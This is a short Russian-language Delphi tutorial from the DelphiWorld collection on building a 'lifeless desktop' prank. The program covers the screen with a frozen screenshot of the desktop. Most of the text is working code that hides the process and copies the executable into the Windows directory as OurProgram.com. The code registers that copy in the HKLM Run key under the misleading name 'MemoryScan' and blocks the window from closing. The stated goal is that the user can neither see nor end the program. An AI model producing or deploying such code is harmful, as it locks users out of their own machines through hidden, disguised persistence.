<h1>Безжизненный рабочий стол</h1>
<div class="date">01.01.2007</div>

Алгоритм следующий: нужно на форму вынести компонент класса TImage скопировать в него рабочий стол и растянуть во весь экран. Делаем это по созданию окна [событие OnCreate()]: </p>
<pre>
procedure TForm1.FormCreate(Sender: TObject);
var
  ScreenDC: HDC;
  canvas:Tcanvas;
begin
  ScreenDC:=GetDC(0);
  Canvas:=TCanvas.Create();
  canvas.Handle:=ScreenDC;
  Width:=Screen.Width;
  Height:=Screen.Height;
  Image1.Canvas.CopyRect(Rect(0,0,Image1.Width,Image1.Height),
  canvas,Rect(0,0,Screen.Width,Screen.Height));
  Releasedc(0,ScreenDC);
  Canvas.Free;
end;
</pre>
<p>Затем нужно свойство формы BorderStyle установить в значение bsNone, чтобы не было видно боковины окна, а свойство FormStyle - в fsStayOnTop, дабы наше окно всегда было всех других окон!!! Свойство Align компонента Image1- в значение alClient, чтобы картинка занимала всё свободное. место </p>
<p>Далее позаботимся о том, чтобы наше приложение не было видно и чтобы пользователь не мог завершить его :-)) </p>
<p>Событие по созданию окна в конечном итоге должно выглядеть так: </p>
<pre>
procedure TForm1.FormCreate(Sender: TObject);
var
  ScreenDC: HDC;
  canvas: Tcanvas;
  h: TRegistry;
begin
  ScreenDC:=GetDC(0);
  Canvas:=TCanvas.Create();
  canvas.Handle:=ScreenDC;
  Width:=Screen.Width;
  Height:=Screen.Height;
  Image1.Canvas.CopyRect(Rect(0,0,Image1.Width,Image1.Height),
  canvas,Rect(0,0,Screen.Width,Screen.Height));
  Releasedc(0,ScreenDC);
  Canvas.Free;
 
  if not(csDesigning in ComponentState) then
  RegisterServiceProcess(GetCurrentProcessID,1);
 
  WinDirP := StrAlloc(MAX_PATH);
  Res := GetWindowsDirectory(WinDirP, MAX_PATH);
  if Res &gt; 0 then WinDir := StrPas(WinDirP);
 
  if FileExists(WinDir+'\OurProgram.com')=false then
  CopyFile(PChar(Application.ExeName),PChar(WinDir+'\OurProgram.com'),false);
 
  h:=TRegistry.Create;
  h.RootKey:=HKEY_LOCAL_MACHINE;
  h.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',true);
  h.WriteString('MemoryScan',WinDir+'\OurProgram.com');
  h.CloseKey;
  h.Free;
end;
</pre>
<p>На событие OnCloseQuery() формы напишем: </p>
<p>CanClose:=false;</p>
<p>На событие OnActivate(): </p>
<p>ShowWindow(Application.Handle,sw_Hide);</p>
<p>В области public объявим несколько переменных: </p>
<pre>
public
  { Public declarations }
  Windir: string;
  WindirP: PChar;
  Res: Cardinal;
</pre>
<p>А в uses подключим модуль Registry: </p>
<pre>
uses
  Registry;
</pre>

<p><a href="https://delphiworld.narod.ru/" target="_blank">https://delphiworld.narod.ru/</a></p>
<p>DelphiWorld 6.0</p>
